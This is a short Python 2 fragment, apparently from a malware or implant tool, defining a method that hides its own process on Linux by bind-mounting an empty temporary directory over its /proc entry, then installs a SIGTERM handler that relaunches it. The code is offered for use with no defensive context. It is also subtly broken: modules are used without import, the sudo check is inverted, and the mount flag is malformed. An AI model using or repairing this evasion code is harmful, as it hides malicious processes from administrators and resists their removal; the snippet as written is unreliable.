import os

# bind mount technique for linux to hide process
def hide_process(self):
    
    ch = string.uppercase + string.digits
     
    token = "".join(random.choice(ch) for i in range(32))

    pid = os.getpid()

    print "[+] Current PID: {0}".format(pid)

    if os.path.isdir("/tmp/{0}".format(token)) is False:

        if os.system("sudo whoami"):
            os.system("sudo mkdir /tmp/{1} && sudo mount -bind /tmp/{1} /proc/{0}".format(pid,token))
    
    signal.signal(signal.SIGTERM, self.relaunch)
